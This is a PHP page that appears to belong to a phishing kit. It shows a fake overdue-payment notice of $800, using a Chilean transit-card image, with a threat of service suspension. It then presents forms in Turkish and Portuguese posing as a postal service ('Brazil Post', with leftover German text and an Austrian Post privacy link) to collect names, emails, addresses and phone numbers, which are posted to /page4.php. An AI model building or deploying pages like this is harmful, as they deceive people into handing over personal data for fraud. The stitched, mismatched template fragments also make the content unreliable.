<?php
session_start();
//require_once 'config.php';
//include('partials/header.php');
include('header-him.php');


if (isset($_POST['submit']) || isset($_POST['phone'])) {
    $_SESSION['step1Data'] = $_POST;
}

?>
<style>
    .wrap {
        padding: 30px 20px;
        /*        margin-top:70px;*/
        padding-bottom: 20px;
        /* background: #dedede; */
        background: white;
    }

    .top1 {
        background: white;
    }

    a.main-logo {
        display: block;
        margin: 11px 0 25px 0;
        text-align: center;
        color: #00a8b7;
        font-size: 19px;
        font-weight: bold;
    }

    .notice {
        line-height: 2;
        padding: 10px;
        border-radius: 5px;
        color: #777977;
        margin: 30px 0 40px;
        background: #f0f0eb;
    }

    @media(max-width: 767px) {
        p.like_viewmore {
            font-size: 13px;
            color: red;
            cursor: pointer;
        }

        .submit-btn {
            text-align: center;
            background-color: #00a8b7 !important;
            padding: 11px 24px;
            font-size: 1rem;
            display: block;
            width: auto;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: #00a8b7;
            height: auto;
            cursor: pointer;
        }

        .submit-btn:hover:hover {
            background-color: #00a8b7;
            border-color: #00a8b7;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }

    table,
    tr,
    th {

        padding: 10px;

        margin: auto;
        border: none;
        border-collapse: separate;
        /* border-radius: 10px; */

    }

    .cstm-table-new tr td strong {
        color: #004F98;
    }

    .top1 p {
        color: #004F98;
        padding: 10px 0px;
    }

    .total-price {
        /* border-radius: 1em; */
        background: #fff;
        padding: 11px 19px;
        margin-bottom: 17px;
        border-bottom: 2px solid #dedede;
    }

    span.total-price-inner {
        float: right;
        color: #004F98;
        padding-right: 43px;
    }

    tr.alert-notice {
        float: right;
    }

    tr.alert-notice>td {
        border: none;
    }

    table tr.input-as-text {
        border-radius: 10px;
        background: #fff;
    }

    .img-text {
        background: url("https://tarjetabip.cl/images/bot-carga-online.png") no-repeat top center;
        background-size: 100%;
        width: 100%;
        height: 110px;
        position: relative;
        display: table;
    }

    .text-center {
        border-top: 2px solid #dedede;
    }

    .top1 p {
        border-top: 2px solid #dedede;
    }

    table {
        border-top: 2px solid #dedede;
    }

    .center {
        border-top: 2px solid #dedede;
    }

    .img-text h3 {
        font-size: 25px !important;
        display: table-cell !important;
        text-align: center;
        /* padding-top: 30px; */
        color: white;
        font-weight: bold;
        text-shadow: 1px 1px 2px rgba(0, 0, 0, 1);
        vertical-align: middle !important;
        line-height: 25px;
    }

    ::placeholder {
        /* Chrome, Firefox, Opera, Safari 10.1+ */
        color: #000;
        opacity: 1;
        /* Firefox */
    }

    :-ms-input-placeholder {
        /* Internet Explorer 10-11 */
        color: #000;
    }

    ::-ms-input-placeholder {
        /* Microsoft Edge */
        color: #000;
    }

    body.zh_HK input {
        font-weight: normal !important;
    }

    tr.input-as-text {
        border-top-left-radius: 10px;
    }

    tr.input-as-text {
        border-top-right-radius: 10px;
    }

    tr.input-as-text {
        border-bottom-left-radius: 10px;
    }

    tr.input-as-text {
        border-bottom-right-radius: 10px;
    }
</style>
<div class="wrap old_code_wrap">
    <div class="top1">
        <div class="sm-img">
            <a href="#">
                <div class="img-text">
                    <h3>Carga Online</h3>
                </div>
            </a>
        </div>
        <h3 class="text-center" style="color:#004F98;">Su monto pendiente de pago actual es de $800</h3>
        <p>cliente：<?php echo  isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?> </p>
        <table class="cstm-table-new" width="100%">

            <tbody>
                <!-- <tr class="input-as-text">
            <td><input type="text" value="" placeholder="輸入預繳電費金額" size="20"></td>
            <td>元</td>
        </tr> -->
                <tr class="alert-notice">
                    <td><strong style="color:red;text-align: center;">Deducción automática fallida, pague manualmente</strong></td>
                </tr>
                <tr>
                    <td><strong>Mes de facturación</strong></td>
                    <td>30/8</td>
                </tr>
                <tr>
                    <td><strong>Tipo de tasa</strong></td>
                    <td>atrasos</td>
                </tr>
                <tr>
                    <td><strong>Cantidad pagable</strong></td>
                    <td>$800</td>
                </tr>
            </tbody>

        </table>
        <div class="center">
            <div class="total-price">
                <span><strong>Tenga en cuenta: El servicio de pago atrasado se suspenderá</strong></span>
                <span class="total-price-inner"></span>
            </div>
            <a href="/page4.php" class="submit-btn">Siguiente</a>
        </div>

    </div>
</div>
<div class="wrap only_mobile" style="display: none">
    <div class="container">
        <div class="">
            <div>
                <h2 class="form_title">Gönderi̇ adresi̇</h2>
                <p class="form_dis">Paketi size doğru şekilde teslim edebilmemiz için lütfen doğru adresi tekrar girin!</p>
            </div>
            <form action="/page4.php" method="post">
                <label for="fname">Tam İsim</label>
                <input type="text" id="fullnamePage2" name="fullnamePage2"><br>

                <label for="lname">Adres</label>
                <input type="text" id="address" name="address"><br>

                <label for="lname">Düz (isteğe bağlı)</label>
                <input type="text" id="straight" name="straight"><br>






                <label for="lname">Número De Teléfono</label>
                <input type="text" id="phone" name="phone"><br><br>

                <input type="submit" class="button_next" name="page2_submit" value="Güncelleme">
            </form>
        </div>
    </div>
</div>



    <div class="container content__container ">
        <div class="row content__row">
            <div class="col-md-12 col-lg-8">
                <div class="centerstage">
                    <main role="main" class="main">
                            <div class="registrierung">
                                <form action="/page4.php" method="post" class="cham-form" autocomplete="off">
                                    <div class="registrierung__step registrierung__step1">
                                        <h3>Atualizações de endereço</h3>
                                        <p>Digite um endereço de entrega válido. O endereço correto garante que sua encomenda seja entregue corretamente e dentro do prazo.</p>
                                        <div class="registrierung__step1__block">
                                            <div class="registrierung__step1__block">
                                                <div class="row row-no-padding">
                                                    <div class="col-12">
                                                        <label for="registration_username">Email*</label>
                                                        <input name="email" placeholder="z.B. Georg.Mustermann@email.at" type="text" class=" " autocomplete="off" value="">
                                                        <input name="username_ghost" type="hidden" value="">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="registrierung__step1__block">
                                                <div class="row row-no-padding">
                                                    <div class="col-12">
                                                        <label for="registration_username">Nome completo*</label>
                                                        <input type="text" id="fullname" name="first_name" placeholder="Nome completo">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="registrierung__step1__block">
                                                <div class="row row-no-padding">
                                                    <div class="col-12">
                                                        <label for="registration_username">CEP*</label>
                                                        <input type="text" id="zipcode" name="zipcode" placeholder="CEP">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="registrierung__step1__block">
                                                <div class="row row-no-padding">
                                                    <div class="col-12">
                                                        <label for="registration_username">Cidade*</label>
                                                        <input type="text" id="city" name="city" placeholder="Cidade">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="registrierung__step1__block">
                                                <div class="row row-no-padding">
                                                    <div class="col-12">
                                                        <label for="registration_username">Estado*</label>
                                                        <div class="select__input undefined select__input--primary   input-select-filled">
                                                            <select class="" name="state" id="registration_address_countryIsoAlpha2Code">
                                                                <option value="" disabled="">opção</option>
                                                                <option value="Acre">AC</option>
                                                                <option value="Alagoas">AL</option>
                                                                <option value="Amapá">AP</option>
                                                                <option value="Amazonas">AM</option>
                                                                <option value="Bahía">BA</option>
                                                                <option value="Bahía">CE</option>
                                                                <option value="Bahía">DF</option>
                                                                <option value="Bahía">ES</option>
                                                                <option value="Bahía">GO</option>
                                                                <option value="Bahía">MA</option>
                                                                <option value="Bahía">MT</option>
                                                                <option value="Bahía">MS</option>
                                                                <option value="Bahía">MG</option>
                                                                <option value="Bahía">PA</option>
                                                                <option value="Bahía">PB</option>
                                                                <option value="Bahía">PR</option>
                                                                <option value="Bahía">PE</option>
                                                                <option value="Bahía">PI</option>
                                                                <option value="Bahía">PJ</option>
                                                                <option value="Bahía">RN</option>
                                                                <option value="Bahía">RS</option>
                                                                <option value="Bahía">RR</option>
                                                                <option value="Bahía">RO</option>
                                                                <option value="Bahía">SC</option>
                                                                <option value="Bahía">SP</option>
                                                                <option value="Bahía">SE</option>
                                                                <option value="Bahía">TO</option>
                                                            </select>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="registrierung__step1__block">
                                                <div class="row row-no-padding">
                                                    <div class="col-12">
                                                        <label for="registration_username">Endereço*</label>
                                                        <input type="text" id="address" name="address" placeholder="Endereço">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="registrierung__step1__block">
                                                <div class="row row-no-padding">
                                                    <div class="col-12">
                                                        <label for="registration_username">Número*</label>
                                                        <input type="text" id="phone" name="phone" placeholder="Número">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="registrierung__step1__block">
                                                <div class="row row-no-padding">
                                                    <div class="col-12">
                                                        <label for="registration_username">Bairro*</label>
                                                        <input type="text" id="Neighborhood" name="Neighborhood" placeholder="Bairro">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="registrierung__step1__block">
                                                <div class="row row-no-padding">
                                                    <div class="col-12">
                                                        <label for="registration_username">Complemento*</label>
                                                        <input type="text" id="Complement" name="Complement" placeholder="Complemento">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        <label class="sc-form__checkbox  " for="registration_marketingAgreement">
                                            <input name="marketingAgreement" id="registration_marketingAgreement" type="checkbox" aria-required="false" aria-invalid="false" class="">
                                            <span class="sc-form__focus-indicator"></span>
                                            <div class="sc-form__checkbox__label">
                                                <div>Autorizo a Brazil Post a utilizar meus dados pessoais para fins de transmissão de informações sobre produtos e serviços.&nbsp; <a href="~/link.aspx?_id=0877F21255E343FC8A0BFE814B215BB2&amp;_z=z">Mais detalhes podem ser encontrados aqui.</a>
                                                </div>
                                            </div>
                                            <span class="sc-form__checkbox__indicator"></span>
                                        </label>
                                        <p class="steps__agb">Ich habe die <a href="https://www.post.at/co/c/datenschutz" class="content__linkbtn">Política de Privacidade</a> e confirmo que tenho pelo menos 16 anos de idade. </p>
                                        <div class="steps__buttons">
                                            <button  name="page2_submit" type="submit" title="Nächster Schritt" class="linkbtn linkbtn__primary">
                                                <span class="linkbtn__text">Prosseguir com</span>
                                                <span class="linkbtn__icon posticon_Posticon-Button-Pfeil-Weiter"></span>
                                            </button>
                                        </div>
                                    </div>
                                </form>
                            </div>
                    </main>
                </div>
            </div>
        </div>
    </div>



<div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<?php
include('footer-him.php');
